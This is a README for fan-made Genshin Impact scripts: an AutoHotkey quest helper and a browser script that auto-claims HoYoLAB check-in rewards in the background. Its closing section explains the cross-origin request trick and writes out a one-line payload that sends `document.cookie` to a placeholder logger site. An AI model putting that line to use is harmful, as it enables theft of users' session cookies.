# Genshin Impact Script(s)
### Contribute to the project so the people have fresh scripts!


__retrier2.ahk__ is now available at GitHub!<br>
(Not a bot, it is Helper for questing)<br>
__genshin-checkin-redeem.js__ is now available at GitHub!<br>
(Used for auto redeem check-in reward)<br>

## retrier2.ahk SETUP
FOR pre-made script: <br>https://www.youtube.com/watch?v=7YDn-NKuO7A<br>
How to maintain: <br>https://www.youtube.com/watch?v=q0eT1Qar_nY

NOTE:
<br>- Script can be used at ANY QUEST, but some MAY end up being STUCK in a loop (Venti's quest is just an example)
<br>- Script can break, so press Home then F2 again if it escalates during Questing

### FAQ
Q: What's center of the mouse?<br>
Q: What's center of the cursor?<br>
A: Look at [this picture (*LINK*)](https://github.com/SlowsieNT/genshin/blob/main/center-of-cursor.png)<br><br>
Q: Will the script be updated in the future?<bR>
A: Not by the author, but there MAY be a change during period before October of this year (2021).

[TEXT] FOR pre-made script:<br>
1. Go to Settings then Graphics
2. Set Quality to: Medium
3. Set Display Mode to: 1440x900 Windowed
4. Go to Settings then Language
5. Select Subtitles to: English

## genshin-checkin-redeem.js
#### NOTE: Only the account that is currently logged in, I may make a script for quick multi-account in few lines(C#) in the future!<br>
Every 3h script will try to check-in<br>
__Script will trigger when you are casually watching youtube videos, or just browsing__<br>
This script will send 2 requests, one will attempt to get checkin game reward, and the other request is another checkin<br>
I have tested it on other accounts and it should be working for you as well<br>
#### ALL SERVERS
Junior Developers may freak out because they'll see error(s) in the console, in the contrary `it just works™` because request is sent, but the response cannot arrive due CORS
- This technique is very common in Hacking
  - It was being used for DoS-ing
  - Or sending `document.cookie` to the 3rd party logger website
    - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`

